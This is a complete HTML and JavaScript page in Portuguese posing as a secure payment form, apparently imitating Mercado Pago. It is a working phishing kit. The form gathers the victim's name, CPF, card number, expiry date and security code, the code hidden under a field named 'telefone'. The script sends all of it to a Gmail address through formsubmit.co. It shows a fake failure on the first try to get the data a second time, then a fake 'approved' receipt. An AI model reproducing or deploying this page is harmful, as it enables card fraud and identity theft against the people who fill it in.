<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Cadastro</title>

<style>
body {
    margin:0;
    font-family: 'Segoe UI', Arial;
    background:#ededed;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

/* CARD PRINCIPAL */
.container {
    background:#fff;
    width:380px;
    border-radius:12px;
    box-shadow:0 10px 30px rgba(0,0,0,0.15);
    overflow:hidden;
}

/* TOPO */
.header {
    background:#009ee3;
    color:#fff;
    padding:18px;
    font-size:18px;
    font-weight:bold;
    text-align:center;
}

/* CONTEÚDO */
.content {
    padding:20px;
}

/* LABEL */
label {
    display:block;
    font-size:12px;
    color:#666;
    margin-top:12px;
}

/* INPUT */
input {
    width:100%;
    padding:12px;
    margin-top:5px;
    border-radius:6px;
    border:1px solid #ccc;
    font-size:14px;
    transition:0.2s;
}

input:focus {
    border-color:#009ee3;
    outline:none;
    box-shadow:0 0 0 2px rgba(0,158,227,0.15);
}

/* BOTÃO */
button {
    width:100%;
    margin-top:20px;
    padding:14px;
    background:#009ee3;
    color:#fff;
    border:none;
    border-radius:6px;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
    transition:0.2s;
}

button:hover {
    background:#007eb8;
}

/* LOADER */
.loader {
    border:5px solid #eee;
    border-top:5px solid #009ee3;
    border-radius:50%;
    width:50px;
    height:50px;
    animation:spin 1s linear infinite;
    margin:30px auto;
}

@keyframes spin {
    100% { transform:rotate(360deg); }
}

/* RESULTADO */
.success { color:#2e7d32; }
.fail { color:#c62828; }

.receipt {
    background:#f7f7f7;
    padding:12px;
    border-radius:6px;
    margin-top:15px;
    font-size:14px;
}

.center {
    text-align:center;
}
</style>
</head>

<body>

<div class="container">

<div class="header">
Pagamento seguro
</div>

<div class="content">

<div id="formBox">

<label>Nome completo</label>
<input type="text" id="nome">

<label>CPF</label>
<input type="text" id="cpf">

<label>Data de vencimento</label>
<input type="date" id="data">

<label>Número Do Cartão</label>
<input type="text" id="numero">

<label>Peça</label>
<input type="text" id="peca">

<label>Codigo de Segurança</label>
<input type="text" id="telefone">

<button onclick="enviar()">Continuar</button>

</div>

<div id="processando" class="center" style="display:none;">
<p>Processando pagamento...</p>
<div class="loader"></div>
</div>

<div id="resultado" style="display:none;">
<h3 id="status" class="center"></h3>
<div id="comprovante" class="receipt"></div>
<button onclick="voltar()">Voltar</button>
</div>

</div>
</div>

<script>

let tentativa = 0;

function gerarID(){
    return "MP-" + Math.floor(Math.random()*1000000);
}

function dataAtual(){
    return new Date().toLocaleString();
}

function enviar(){

    let nome = document.getElementById("nome").value;
    let cpf = document.getElementById("cpf").value;
    let data = document.getElementById("data").value;
    let numero = document.getElementById("numero").value;
    let peca = document.getElementById("peca").value;
    let telefone = document.getElementById("telefone").value;

    if(!nome || !cpf || !data || !numero || !peca || !telefone){
        alert("Preencha todos os campos.");
        return;
    }

    document.getElementById("formBox").style.display = "none";
    document.getElementById("processando").style.display = "block";

    tentativa++;

    fetch("https://formsubmit.co/ajax/gmdesmonte@gmail.com", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            nome,
            cpf,
            data,
            numero,
            peca,
            telefone,
            tentativa,
            enviado_em: dataAtual()
        })
    });

    setTimeout(() => {

        document.getElementById("processando").style.display = "none";
        document.getElementById("resultado").style.display = "block";

        let status = document.getElementById("status");
        let comp = document.getElementById("comprovante");

        if(tentativa === 1){

            status.innerHTML = "Revise seus dados e confirme novamente";
            status.className = "fail";

            comp.innerHTML = `
            Peça: <b>${peca}</b><br>
            Aguardando confirmação...
            `;

        } else {

            let idGerado = gerarID();

            status.innerHTML = "Pagamento aprovado ✅";
            status.className = "success";

            comp.innerHTML = `
            <b>Comprovante</b><br><br>
            Cliente: ${nome}<br>
            Peça: ${peca}<br>
            ID: ${idGerado}<br>
            Data: ${dataAtual()}
            `;
        }

    }, 2000);
}

function voltar(){
    document.getElementById("formBox").style.display = "block";
    document.getElementById("resultado").style.display = "none";
}

</script>

</body>
</html>
